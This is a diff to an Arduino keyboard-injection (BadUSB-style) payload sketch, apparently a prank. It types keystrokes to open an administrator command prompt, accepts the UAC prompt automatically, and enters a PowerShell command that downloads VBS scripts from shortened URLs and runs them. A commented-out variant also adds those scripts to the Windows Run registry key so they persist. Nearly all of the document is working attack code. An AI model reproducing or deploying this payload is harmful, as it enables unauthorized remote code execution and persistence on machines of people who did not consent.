@@ -17,17 +17,18 @@ void runPayload() {
 	delay(1000);
 
 	// Open CMD
-	Keyboard.press(KEY_LEFT_GUI);
-	Keyboard.press('x');
-	Keyboard.releaseAll();
-	delay(200);
-	// Press the UP key 8 times
-	for (int i = 0; i < 8; i++) {
-		typeKey(KEY_UP_ARROW);
-	}
-	delay(200);
-	typeKey(KEY_RETURN);
+	typeKey(KEY_LEFT_GUI);
 	delay(500);
+	Keyboard.print("cmd");
+	delay(200);
+	Keyboard.press(KEY_LEFT_CTRL);
+	Keyboard.press(KEY_LEFT_SHIFT);
+	Keyboard.press(KEY_RETURN);
+	Keyboard.releaseAll();
+	Keyboard.end();
+
+	delay(500);
+
 	// Bypass UAC prompt
 	Keyboard.press(KEY_LEFT_ALT);
 	Keyboard.press('y');
@@ -37,8 +38,8 @@ void runPayload() {
 	delay(200);
 
 	// Download and run rickroll.vbs and exit when done
-	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
-	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\\volup.vbs && exit");
+	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
+	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\\volup.vbs && exit");
 	delay(100);
 	typeKey(KEY_RETURN);
 
